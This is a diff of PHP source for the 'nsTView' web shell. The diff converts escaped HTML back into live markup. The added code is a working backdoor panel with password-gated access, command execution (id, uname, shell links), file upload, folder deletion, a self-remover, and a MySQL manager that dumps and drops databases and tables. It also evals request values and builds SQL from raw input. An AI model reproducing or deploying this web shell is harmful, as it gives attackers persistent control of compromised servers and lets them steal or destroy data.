@@ -136,20 +136,20 @@ if($create_password==true){
 
 if(!isset($_SESSION['nst']) or $_SESSION['nst']!=$password){
 die("
-&lt;title&gt;nsTView $ver:: nst.void.ru&lt;/title&gt;
-&lt;center&gt;
-&lt;table width=100 bgcolor=#D7FFA8 border=1 bordercolor=black&gt;&lt;tr&gt;&lt;td&gt;
-&lt;font size=1 face=verdana&gt;&lt;center&gt;
-&lt;b&gt;nsTView $ver :: &lt;a href=http://nst.void.ru style='text-decoration:none;'&gt;&lt;font color=black&gt;nst.void.ru&lt;/font&gt;&lt;/a&gt;&lt;br&gt;&lt;/b&gt;
-&lt;/center&gt;
-&lt;form method=post&gt;
-Password:&lt;br&gt;
-&lt;input type=password name=pass size=30 tabindex=1&gt;
-&lt;/form&gt;
-&lt;b&gt;Host:&lt;/b&gt; ".$_SERVER["HTTP_HOST"]."&lt;br&gt;
-&lt;b&gt;IP:&lt;/b&gt; ".gethostbyname($_SERVER["HTTP_HOST"])."&lt;br&gt;
-&lt;b&gt;Your ip:&lt;/b&gt; ".$ip."
-&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+<title>nsTView $ver:: nst.void.ru</title>
+<center>
+<table width=100 bgcolor=#D7FFA8 border=1 bordercolor=black><tr><td>
+<font size=1 face=verdana><center>
+<b>nsTView $ver :: <a href=http://nst.void.ru style='text-decoration:none;'><font color=black>nst.void.ru</font></a><br></b>
+</center>
+<form method=post>
+Password:<br>
+<input type=password name=pass size=30 tabindex=1>
+</form>
+<b>Host:</b> ".$_SERVER["HTTP_HOST"]."<br>
+<b>IP:</b> ".gethostbyname($_SERVER["HTTP_HOST"])."<br>
+<b>Your ip:</b> ".$ip."
+</td></tr></table>
 ");}
 
 }
@@ -192,7 +192,7 @@ die;
 $images=array(".gif",".jpg",".png",".bmp",".jpeg");
 $whereme=getcwd();
 @$d=@$_GET['d'];
-$copyr = "&lt;center&gt;&lt;a href=http://nst.void.ru target=_blank&gt;nsTView $ver&lt;br&gt;o... Network security team ...o&lt;/a&gt;";
+$copyr = "<center><a href=http://nst.void.ru target=_blank>nsTView $ver<br>o... Network security team ...o</a>";
 $php_self=@$_SERVER['PHP_SELF'];
 if(@eregi("/",$whereme)){$os="unix";}else{$os="win";}
 if(!isset($d)){$d=$whereme;}
@@ -209,8 +209,8 @@ if(@$_GET['getdb']=="1"){
 header('Content-type: application/plain-text');
 header('Content-Disposition: attachment; filename=nst-mysql-damp.htm');
 }
-print "&lt;title&gt;nsT View $ver&lt;/title&gt;
-&lt;style&gt;
+print "<title>nsT View $ver</title>
+<style>
 BODY, TD, TR {
 text-decoration: none;
 font-family: Verdana;
@@ -248,8 +248,8 @@ TEXT-DECORATION: none
 A:visited {
 TEXT-DECORATION: none
 }
-&lt;/style&gt;
-&lt;script&gt;
+</style>
+<script>
 function ShowOrHide(d1, d2) {
 if (d1 != '') DoDiv(d1);
 if (d2 != '') DoDiv(d2);}
@@ -274,91 +274,91 @@ document.sh311Form.sh3.focus();
 }
 
 
-&lt;/script&gt;
+</script>
 ";
-print "&lt;body vlink=#0006DE&gt;
-&lt;table width=600 border=0 cellpadding=0 cellspacing=1 bgcolor=#D7FFA8 align=center&gt;
-&lt;tr&gt;&lt;td&gt;&lt;font face=wingdings size=2&gt;0&lt;/font&gt;";
+print "<body vlink=#0006DE>
+<table width=600 border=0 cellpadding=0 cellspacing=1 bgcolor=#D7FFA8 align=center>
+<tr><td><font face=wingdings size=2>0</font>";
 $expl=explode("/",$d);
 $coun=count($expl);
-if($os=="unix"){echo "&lt;a href='$php_self?d=/'&gt;/&lt;/a&gt;";}
+if($os=="unix"){echo "<a href='$php_self?d=/'>/</a>";}
 else{
-        echo "&lt;a href='$php_self?d=$expl[0]'&gt;$expl[0]/&lt;/a&gt;";}
-for($i=1; $i&lt;$coun; $i++){
+        echo "<a href='$php_self?d=$expl[0]'>$expl[0]/</a>";}
+for($i=1; $i<$coun; $i++){
         @$xx.=$expl[$i]."/";
-$sls="&lt;a href='$php_self?d=$expl[0]/$xx'&gt;$expl[$i]&lt;/a&gt;/";
+$sls="<a href='$php_self?d=$expl[0]/$xx'>$expl[$i]</a>/";
 $sls=str_replace("//","/",$sls);
-$sls=str_replace("/'&gt;&lt;/a&gt;/","/'&gt;&lt;/a&gt;",$sls);
+$sls=str_replace("/'></a>/","/'></a>",$sls);
 print $sls;
 }
 if(@ini_get("register_globals")){$reg_g="ON";}else{$reg_g="OFF";}
 if(@ini_get("safe_mode")){$safe_m="ON";}else{$safe_m="OFF";}
-echo "&lt;/td&gt;&lt;/tr&gt;";
+echo "</td></tr>";
 if($os=="unix"){ echo "
-&lt;tr&gt;&lt;td&gt;&lt;b&gt;id:&lt;/b&gt; ".@exec('id')."&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;td&gt;&lt;b&gt;uname -a:&lt;/b&gt; ".@exec('uname -a')."&lt;/td&gt;&lt;/tr&gt;";} echo"
-&lt;tr&gt;&lt;td&gt;&lt;b&gt;Your IP: [&lt;font color=#5F3CC1&gt;$ip&lt;/font&gt;] Server IP: [&lt;font color=#5F3CC1&gt;".gethostbyname($_SERVER["HTTP_HOST"])."&lt;/font&gt;] Server &lt;a href=# title='Host.Domain'&gt;H.D.&lt;/a&gt;: [&lt;font color=#5F3CC1&gt;".$_SERVER["HTTP_HOST"]."&lt;/font&gt;]&lt;/b&gt;&lt;br&gt;
-[&lt;b&gt;Safe mode:&lt;/b&gt; $safe_m] [&lt;b&gt;Register globals:&lt;/b&gt; $reg_g]&lt;br&gt;
-[&lt;a href=# onClick=location.href=\"javascript:history.back(-1)\"&gt;Back&lt;/a&gt;]
-[&lt;a href='$php_self'&gt;Home&lt;/a&gt;]
-[&lt;a href='$php_self?d=$d&sh311=1'&gt;Shell (1)&lt;/a&gt; &lt;a href='$php_self?d=$d&sh311=2'&gt;(2)&lt;/a&gt;]
-[&lt;a href='$php_self?d=$d&t=upload'&gt;Upload&lt;/a&gt;]
-[&lt;a href='$php_self?t=tools'&gt;Tools&lt;/a&gt;]
-[&lt;a href='$php_self?p=info'&gt;PHPinfo&lt;/a&gt;]
-[&lt;a href='$php_self?delfolder=$d&d=$d&delfl=1&rback=$d' title='$d'&gt;DEL Folder&lt;/a&gt;]
-[&lt;a href='$php_self?p=sql'&gt;SQL&lt;/a&gt;]
-[&lt;a href='$php_self?p=selfremover'&gt;Self Remover&lt;/a&gt;]
-&lt;/td&gt;&lt;/tr&gt;
+<tr><td><b>id:</b> ".@exec('id')."</td></tr>
+<tr><td><b>uname -a:</b> ".@exec('uname -a')."</td></tr>";} echo"
+<tr><td><b>Your IP: [<font color=#5F3CC1>$ip</font>] Server IP: [<font color=#5F3CC1>".gethostbyname($_SERVER["HTTP_HOST"])."</font>] Server <a href=# title='Host.Domain'>H.D.</a>: [<font color=#5F3CC1>".$_SERVER["HTTP_HOST"]."</font>]</b><br>
+[<b>Safe mode:</b> $safe_m] [<b>Register globals:</b> $reg_g]<br>
+[<a href=# onClick=location.href=\"javascript:history.back(-1)\">Back</a>]
+[<a href='$php_self'>Home</a>]
+[<a href='$php_self?d=$d&sh311=1'>Shell (1)</a> <a href='$php_self?d=$d&sh311=2'>(2)</a>]
+[<a href='$php_self?d=$d&t=upload'>Upload</a>]
+[<a href='$php_self?t=tools'>Tools</a>]
+[<a href='$php_self?p=info'>PHPinfo</a>]
+[<a href='$php_self?delfolder=$d&d=$d&delfl=1&rback=$d' title='$d'>DEL Folder</a>]
+[<a href='$php_self?p=sql'>SQL</a>]
+[<a href='$php_self?p=selfremover'>Self Remover</a>]
+</td></tr>
 ";
 if($os=="win"){ echo "
-&lt;tr&gt;&lt;td bgcolor=white&gt;
-&lt;center&gt;&lt;font face=wingdings size=2&gt;&lt;&lt;/font&gt;
-&lt;a href='$php_self?d=a:/'&gt;A&lt;/a&gt;
-&lt;a href='$php_self?d=b:/'&gt;B&lt;/a&gt;
-&lt;a href='$php_self?d=c:/'&gt;C&lt;/a&gt;
-&lt;a href='$php_self?d=d:/'&gt;D&lt;/a&gt;
-&lt;a href='$php_self?d=e:/'&gt;E&lt;/a&gt;
-&lt;a href='$php_self?d=f:/'&gt;F&lt;/a&gt;
-&lt;a href='$php_self?d=g:/'&gt;G&lt;/a&gt;
-&lt;a href='$php_self?d=h:/'&gt;H&lt;/a&gt;
-&lt;a href='$php_self?d=i:/'&gt;I&lt;/a&gt;
-&lt;a href='$php_self?d=j:/'&gt;J&lt;/a&gt;
-&lt;a href='$php_self?d=k:/'&gt;K&lt;/a&gt;
-&lt;a href='$php_self?d=l:/'&gt;L&lt;/a&gt;
-&lt;a href='$php_self?d=m:/'&gt;M&lt;/a&gt;
-&lt;a href='$php_self?d=n:/'&gt;N&lt;/a&gt;
-&lt;a href='$php_self?d=o:/'&gt;O&lt;/a&gt;
-&lt;a href='$php_self?d=p:/'&gt;P&lt;/a&gt;
-&lt;a href='$php_self?d=q:/'&gt;Q&lt;/a&gt;
-&lt;a href='$php_self?d=r:/'&gt;R&lt;/a&gt;
-&lt;a href='$php_self?d=s:/'&gt;S&lt;/a&gt;
-&lt;a href='$php_self?d=t:/'&gt;T&lt;/a&gt;
-&lt;a href='$php_self?d=u:/'&gt;U&lt;/a&gt;
-&lt;a href='$php_self?d=v:/'&gt;V&lt;/a&gt;
-&lt;a href='$php_self?d=w:/'&gt;W&lt;/a&gt;
-&lt;a href='$php_self?d=x:/'&gt;X&lt;/a&gt;
-&lt;a href='$php_self?d=y:/'&gt;Y&lt;/a&gt;
-&lt;a href='$php_self?d=z:/'&gt;Z&lt;/a&gt;
-&lt;/td&gt;&lt;/tr&gt;";}else{echo "&lt;tr&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;/tr&gt;";}
-print "&lt;tr&gt;&lt;td&gt;
-:: &lt;a href='$php_self?d=$d&mkdir=1'&gt;Create folder&lt;/a&gt; ::
-&lt;a href='$php_self?d=$d&mkfile=1'&gt;Create file&lt;/a&gt; ::
-&lt;a href='$php_self?d=$d&read_file_safe_mode=1'&gt;Read file if safe mode is On&lt;/a&gt; ::";
+<tr><td bgcolor=white>
+<center><font face=wingdings size=2><</font>
+<a href='$php_self?d=a:/'>A</a>
+<a href='$php_self?d=b:/'>B</a>
+<a href='$php_self?d=c:/'>C</a>
+<a href='$php_self?d=d:/'>D</a>
+<a href='$php_self?d=e:/'>E</a>
+<a href='$php_self?d=f:/'>F</a>
+<a href='$php_self?d=g:/'>G</a>
+<a href='$php_self?d=h:/'>H</a>
+<a href='$php_self?d=i:/'>I</a>
+<a href='$php_self?d=j:/'>J</a>
+<a href='$php_self?d=k:/'>K</a>
+<a href='$php_self?d=l:/'>L</a>
+<a href='$php_self?d=m:/'>M</a>
+<a href='$php_self?d=n:/'>N</a>
+<a href='$php_self?d=o:/'>O</a>
+<a href='$php_self?d=p:/'>P</a>
+<a href='$php_self?d=q:/'>Q</a>
+<a href='$php_self?d=r:/'>R</a>
+<a href='$php_self?d=s:/'>S</a>
+<a href='$php_self?d=t:/'>T</a>
+<a href='$php_self?d=u:/'>U</a>
+<a href='$php_self?d=v:/'>V</a>
+<a href='$php_self?d=w:/'>W</a>
+<a href='$php_self?d=x:/'>X</a>
+<a href='$php_self?d=y:/'>Y</a>
+<a href='$php_self?d=z:/'>Z</a>
+</td></tr>";}else{echo "<tr><td>&nbsp;</td></tr>";}
+print "<tr><td>
+:: <a href='$php_self?d=$d&mkdir=1'>Create folder</a> ::
+<a href='$php_self?d=$d&mkfile=1'>Create file</a> ::
+<a href='$php_self?d=$d&read_file_safe_mode=1'>Read file if safe mode is On</a> ::";
 if($os=="unix"){
-print "&lt;a href='$php_self?d=$d&ps_table=1'&gt;PS table&lt;/a&gt; ::";
+print "<a href='$php_self?d=$d&ps_table=1'>PS table</a> ::";
 }
-print "&lt;/td&gt;&lt;/tr&gt;";
+print "</td></tr>";
 
 
 
 
 
 if($_GET['p']=="ftp"){
-print "&lt;tr&gt;&lt;td&gt;";
+print "<tr><td>";
 
 
 
-print "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+print "</td></tr></table>";
 print $copyr;
 exit;
 }
@@ -373,7 +373,7 @@ exit;
 
 
 if(@$_GET['p']=="sql"){
-print "&lt;tr&gt;&lt;td&gt;";
+print "<tr><td>";
 
 ####
 
@@ -404,26 +404,26 @@ if(!isset($to)){$to=50;}
 
 
 ?>
-&lt;style&gt;
+<style>
 table,td{
 color: black;
 font-face: verdana;
 font-size: 11px;
 
 }
-&lt;/style&gt;
-&lt;font color=black face=verdana size=1&gt;
+</style>
+<font color=black face=verdana size=1>
 <? if(!$conn){ ?>
 
-&lt;!-- table 1 --&gt;
-&lt;table bgcolor=#D7FFA8&gt;
-&lt;tr&gt;&lt;td valign=top&gt;Address:&lt;/td&gt;&lt;td&gt;&lt;form&gt;&lt;input name=adress value='<?=$adress?>' size=20&gt;&lt;input name=port value='<?=$port?>' size=6&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;Td valign=top&gt;Login: &lt;/td&gt;&lt;td&gt;&lt;input name=login value='<?=$login?>' size=10&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;Td valign=top&gt;Pass:&lt;/td&gt;&lt;td&gt; &lt;input name=pass value='<?=$pass?>' size=10&gt;&lt;input type=hidden name=p value=sql&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit name=conn value=Connect&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;<?}?>
-&lt;tr&gt;&lt;td valign=top&gt;<? if($conn){ echo "&lt;b&gt;PHP v".@phpversion()."&lt;br&gt;mySQL v".@mysql_get_server_info()."&lt;br&gt;";}?>&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;
-&lt;/table&gt;
-&lt;!-- end of table 1 --&gt;
+<!-- table 1 -->
+<table bgcolor=#D7FFA8>
+<tr><td valign=top>Address:</td><td><form><input name=adress value='<?=$adress?>' size=20><input name=port value='<?=$port?>' size=6></td></tr>
+<tr><Td valign=top>Login: </td><td><input name=login value='<?=$login?>' size=10></td></tr>
+<tr><Td valign=top>Pass:</td><td> <input name=pass value='<?=$pass?>' size=10><input type=hidden name=p value=sql></td></tr>
+<tr><td></td><td><input type=submit name=conn value=Connect></form></td></tr><?}?>
+<tr><td valign=top><? if($conn){ echo "<b>PHP v".@phpversion()."<br>mySQL v".@mysql_get_server_info()."<br>";}?></b></td><td></td></tr>
+</table>
+<!-- end of table 1 -->
 
 
 <?
@@ -434,40 +434,40 @@ $login=$_GET['login'];
 $pass=$_GET['pass'];
 if($conn){
 
-$serv = @mysql_connect($adress.":".$port, $login,$pass) or die("&lt;font color=red&gt;Error: ".mysql_error()."&lt;/font&gt;");
-if($serv){$status="Connected. :: &lt;a href='$php_self?p=sql'&gt;Log out&lt;/a&gt;";}else{$status="Disconnected.";}
-print "&lt;b&gt;&lt;font color=green&gt;Status: $status&lt;br&gt;&lt;br&gt;"; # #D7FFA8
-print "&lt;table cellpadding=0 cellspacing=0 bgcolor=#D7FFA8&gt;&lt;tr&gt;&lt;td valign=top&gt;";
-print "&lt;br&gt;&lt;font color=red&gt;[db]&lt;/font&gt;&lt;Br&gt;";
-print "&lt;font color=white&gt;";
+$serv = @mysql_connect($adress.":".$port, $login,$pass) or die("<font color=red>Error: ".mysql_error()."</font>");
+if($serv){$status="Connected. :: <a href='$php_self?p=sql'>Log out</a>";}else{$status="Disconnected.";}
+print "<b><font color=green>Status: $status<br><br>"; # #D7FFA8
+print "<table cellpadding=0 cellspacing=0 bgcolor=#D7FFA8><tr><td valign=top>";
+print "<br><font color=red>[db]</font><Br>";
+print "<font color=white>";
 $res = mysql_list_dbs($serv);
 while ($str=mysql_fetch_row($res)){
-print "&lt;a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&delete_db=$str[0]' onclick='return confirm(\"DELETE $str[0] ?\")'&gt;[DEL]&lt;a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$str[0]&dump_db=$str[0]&f_d=$d'&gt;[DUMP]&lt;/a&gt;&lt;/a&gt; &lt;b&gt;&lt;a href='$php_self?baza=1&db=$str[0]&p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'&gt;$str[0]&lt;/a&gt;&lt;/b&gt;&lt;br&gt;";
+print "<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&delete_db=$str[0]' onclick='return confirm(\"DELETE $str[0] ?\")'>[DEL]<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$str[0]&dump_db=$str[0]&f_d=$d'>[DUMP]</a></a> <b><a href='$php_self?baza=1&db=$str[0]&p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'>$str[0]</a></b><br>";
 $tc++;
 }
 $baza=$_GET['baza'];
 $db=$_GET['db'];
-print "&lt;font color=red&gt;[Total db: $tc]&lt;/font&gt;&lt;br&gt;";
+print "<font color=red>[Total db: $tc]</font><br>";
 if($baza){
-print "&lt;div align=left&gt;&lt;font color=green&gt;db: [$db]&lt;/div&gt;&lt;/font&gt;&lt;br&gt;";
+print "<div align=left><font color=green>db: [$db]</div></font><br>";
 $result=@mysql_list_tables($db);
 while($str=@mysql_fetch_array($result)){
 $c=mysql_query ("SELECT COUNT(*) FROM $str[0]");
 $records=mysql_fetch_array($c);
 
-if(strlen($str[0])&gt;$s4ot){$s4ot=strlen($str[0]);}
+if(strlen($str[0])>$s4ot){$s4ot=strlen($str[0]);}
 if($records[0]=="0"){
-print "&lt;a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&delete_table=$str[0]' onclick='return confirm(\"DELETE $str[0] ?\")' title='Delete $str[0]?'&gt;[D]&lt;/a&gt;&lt;a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1&rename_table=$str[0]' title='Rename $str[0]'&gt;[R]&lt;/a&gt;&lt;font color=red&gt;[$records[0]]&lt;/font&gt; &lt;a href='$php_self?vnutr=1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]&ins_new_line=1'&gt;$str[0]&lt;/a&gt;&lt;br&gt;";
+print "<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&delete_table=$str[0]' onclick='return confirm(\"DELETE $str[0] ?\")' title='Delete $str[0]?'>[D]</a><a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1&rename_table=$str[0]' title='Rename $str[0]'>[R]</a><font color=red>[$records[0]]</font> <a href='$php_self?vnutr=1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]&ins_new_line=1'>$str[0]</a><br>";
 }else{
-print "&lt;a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&delete_table=$str[0]' onclick='return confirm(\"DELETE $str[0] ?\")' title='Delete $str[0]?'&gt;[D]&lt;/a&gt;&lt;a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1&rename_table=$str[0]' title='Rename $str[0]'&gt;[R]&lt;/a&gt;&lt;font color=red&gt;[$records[0]]&lt;/font&gt; &lt;a href='$php_self?vnutr=1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'&gt;$str[0]&lt;/a&gt;&lt;br&gt;";
+print "<a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&delete_table=$str[0]' onclick='return confirm(\"DELETE $str[0] ?\")' title='Delete $str[0]?'>[D]</a><a href='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1&rename_table=$str[0]' title='Rename $str[0]'>[R]</a><font color=red>[$records[0]]</font> <a href='$php_self?vnutr=1&p=sql&vn=$str[0]&baza=1&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$str[0]'>$str[0]</a><br>";
 }
 mysql_free_result($c);
 $total_t++;
 }
-print "&lt;br&gt;&lt;B&gt;&lt;font color=red&gt;Total tables: $total_t&lt;/font&gt;&lt;/b&gt;";
-                                print "&lt;pre&gt;";
-for($i=0; $i&lt;$s4ot+10; $i++){print "&nbsp;";}
-                                print "&lt;/pre&gt;";
+print "<br><B><font color=red>Total tables: $total_t</font></b>";
+                                print "<pre>";
+for($i=0; $i<$s4ot+10; $i++){print "&nbsp;";}
+                                print "</pre>";
 } #end baza
 
 
@@ -475,100 +475,100 @@ for($i=0; $i&lt;$s4ot+10; $i++){print "&nbsp;";}
 
 # delete table
 if(isset($delete_table)){
-mysql_select_db($_GET['db']) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
-mysql_query("DROP TABLE IF EXISTS $delete_table") or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
-print "&lt;br&gt;&lt;b&gt;&lt;font color=green&gt;Table [ $delete_table ] :: Deleted success!&lt;/font&gt;&lt;/b&gt;";
-print "&lt;meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1\"&gt;";
+mysql_select_db($_GET['db']) or die("<font color=red>".mysql_error()."</font>");
+mysql_query("DROP TABLE IF EXISTS $delete_table") or die("<font color=red>".mysql_error()."</font>");
+print "<br><b><font color=green>Table [ $delete_table ] :: Deleted success!</font></b>";
+print "<meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&db=$db&baza=1\">";
 }
 # end of delete table
 
 # delete database
 if(isset($_GET['delete_db'])){
-mysql_drop_db($_GET['delete_db']) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
-print "&lt;br&gt;&lt;b&gt;&lt;font color=green&gt;Database ".$_GET['delete_db']." :: Deleted Success!";
-print "&lt;meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1\"&gt;";
+mysql_drop_db($_GET['delete_db']) or die("<font color=red>".mysql_error()."</font>");
+print "<br><b><font color=green>Database ".$_GET['delete_db']." :: Deleted Success!";
+print "<meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1\">";
 }
 # end of delete database
 
 # delete row
 if(isset($_POST['delete_row'])){
 $_POST['delete_row'] = base64_decode($_POST['delete_row']);
-mysql_query("DELETE FROM ".$_GET['tbl']." WHERE ".$_POST['delete_row']) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
-$del_result = "&lt;br&gt;&lt;b&gt;&lt;font color=green&gt;Deleted Success!&lt;br&gt;".$_POST['delete_row'];
-print "&lt;meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\"&gt;";
+mysql_query("DELETE FROM ".$_GET['tbl']." WHERE ".$_POST['delete_row']) or die("<font color=red>".mysql_error()."</font>");
+$del_result = "<br><b><font color=green>Deleted Success!<br>".$_POST['delete_row'];
+print "<meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\">";
 }
 # end of delete row
 
 
 $vn=$_GET['vn'];
-print "&lt;/td&gt;&lt;td valign=top&gt;";
-print "&lt;font color=green&gt;Database: $db =&gt; $vn&lt;/font&gt;";
+print "</td><td valign=top>";
+print "<font color=green>Database: $db => $vn</font>";
 
 # edit row
 if(isset($_POST['edit_row'])){
 $edit_row=base64_decode($_POST['edit_row']);
 
-$r_edit = mysql_query("SELECT * FROM $tbl WHERE $edit_row") or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
-print "&lt;br&gt;&lt;br&gt;
-       &lt;table border=0 cellpadding=1 cellspacing=1&gt;&lt;tr&gt;
-       &lt;td&gt;&lt;b&gt;Row&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Value&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
-print  "&lt;form method=post action='$php_self?p=sql&login=".$_GET['login']."&pass=".$_GET['pass']."&adress=".$_GET['adress']."&conn=1&baza=1&tbl=".$_GET['tbl']."&vn=".$_GET['vn']."&db=".$_GET['db']."'&gt;";
-print  "&lt;input type=hidden name=edit_row value='".$_POST['edit_row']."'&gt;";
-print " &lt;input type=radio name=upd value=update checked&gt;Update&lt;br&gt;
-        &lt;input type=radio name=upd value=insert&gt;Insert new&lt;br&gt;&lt;br&gt;";
+$r_edit = mysql_query("SELECT * FROM $tbl WHERE $edit_row") or die("<font color=red>".mysql_error()."</font>");
+print "<br><br>
+       <table border=0 cellpadding=1 cellspacing=1><tr>
+       <td><b>Row</b></td><td><b>Value</b></td></tr>";
+print  "<form method=post action='$php_self?p=sql&login=".$_GET['login']."&pass=".$_GET['pass']."&adress=".$_GET['adress']."&conn=1&baza=1&tbl=".$_GET['tbl']."&vn=".$_GET['vn']."&db=".$_GET['db']."'>";
+print  "<input type=hidden name=edit_row value='".$_POST['edit_row']."'>";
+print " <input type=radio name=upd value=update checked>Update<br>
+        <input type=radio name=upd value=insert>Insert new<br><br>";
 
 
 $i=0;
 while($mn = mysql_fetch_array($r_edit, MYSQL_ASSOC)){
-foreach($mn as $key =&gt;$val){
+foreach($mn as $key =>$val){
 $type  = mysql_field_type($r_edit, $i);
 $len  = mysql_field_len($r_edit, $i);
 $del .= "`$key`='".adds($val)."' AND ";
 $c=strlen($val);
 $val=htmlspecialchars($val, ENT_NOQUOTES);
-$str=" &lt;textarea name='$key' cols=39 rows=5&gt;$val&lt;/textarea&gt; ";
-$buff .= "&lt;tr&gt;&lt;td bgcolor=silver&gt;&lt;b&gt;$key&lt;/b&gt;&lt;br&gt;&lt;font color=green&gt;(&lt;b&gt;$type($len)&lt;/b&gt;)&lt;/font&gt;&lt;/td&gt;&lt;td&gt;$str&lt;/td&gt;&lt;/tr&gt;";
+$str=" <textarea name='$key' cols=39 rows=5>$val</textarea> ";
+$buff .= "<tr><td bgcolor=silver><b>$key</b><br><font color=green>(<b>$type($len)</b>)</font></td><td>$str</td></tr>";
 $i++;
 }
 
 }
 $delstring=base64_encode($del);
-print "&lt;input type=hidden name=delstring value=\"$delstring\"&gt;";
-print "$buff&lt;/table&gt;&lt;br&gt;";
-print "&lt;br&gt;";
-if(!$_POST['makeupdate']){print "&lt;input type=submit value=Update name=makeupdate&gt;&lt;/form&gt;";}
+print "<input type=hidden name=delstring value=\"$delstring\">";
+print "$buff</table><br>";
+print "<br>";
+if(!$_POST['makeupdate']){print "<input type=submit value=Update name=makeupdate></form>";}
 
 
 
 
 if($_POST['makeupdate']){
 if($_POST['upd']=='update'){
-preg_match_all("/name='(.*?)'\scols=39\srows=5&gt;(.*?)&lt;\/textarea&gt;/i",$buff,$matches3);
+preg_match_all("/name='(.*?)'\scols=39\srows=5>(.*?)<\/textarea>/i",$buff,$matches3);
 $delstring=$_POST['delstring'];
 $delstring=base64_decode($delstring);
 $delstring = substr($delstring, 0, strlen($delstring)-5);
 
-for($i=0; $i&lt;count($matches3[0]); $i++){
+for($i=0; $i<count($matches3[0]); $i++){
 eval("\$".$matches3[1][$i]." = \"".adds2($_POST[$matches3[1][$i]])."\";");
 $total_str .= $matches3[1][$i]."='".adds2($_POST[$matches3[1][$i]])."',";
 }
 $total_str = substr_replace($total_str,"",-1);
 $up_string = "UPDATE `$tbl` SET $total_str WHERE $delstring";
 $up_string = htmlspecialchars($up_string, ENT_NOQUOTES);
-print "&lt;b&gt;PHP var:&lt;br&gt;&lt;/b&gt;\$sql=\"$up_string\";&lt;br&gt;&lt;br&gt;";
-print "&lt;meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\"&gt;";
-mysql_query($up_string) or die("&lt;font color=red&gt;".mysql_error()."&lt;/font&gt;");
+print "<b>PHP var:<br></b>\$sql=\"$up_string\";<br><br>";
+print "<meta http-equiv=\"REFRESH\" content=\"5;URL=$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&vnutr=1&baza=1&vn=".$_GET['vn']."&db=$db&tbl=$tbl\">";
+mysql_query($up_string) or die("<font color=red>".mysql_error()."</font>");
 }#end of make update
 
 
 
 if($_POST['upd']=='insert'){
-preg_match_all("/name='(.*?)'\scols=39\srows=5&gt;(.*?)&lt;\/textarea&gt;/i",$buff,$matches3);
+preg_match_all("/name='(.*?)'\scols=39\srows=5>(.*?)<\/textarea>/i",$buff,$matches3);
 $delstring=$_POST['delstring'];
 $delstring=base64_decode($delstring);
 $delstring = substr($delstring, 0, strlen($delstring)-5);
 
-for($i=0; $i&lt;count($matches3[0]); $i++){
+for($i=0; $i<count($matches3[0]); $i++){
 eval("\$".$matches3[1][$i]." = \"".adds2($_POST[$matches3[1][$i]])."\";");
 $total_str .= $matches3[1][$i]."='".adds2($_POST[$matches3[1][$i]])."',,";
 }
@@ -577,7 +577,7 @@ $total_str = ",,".$total_str;
 
 preg_match_all("/,(.*?)='(.*?)',/i",$total_str,$matches4);
 
-for($i=0; $i&lt;count($matches4[1]); $i++){
+for($i=0; $i<count($matches4[1]); $i++){
         $matches4[1][0]=str_replace(",","",$matches4[1][0]);
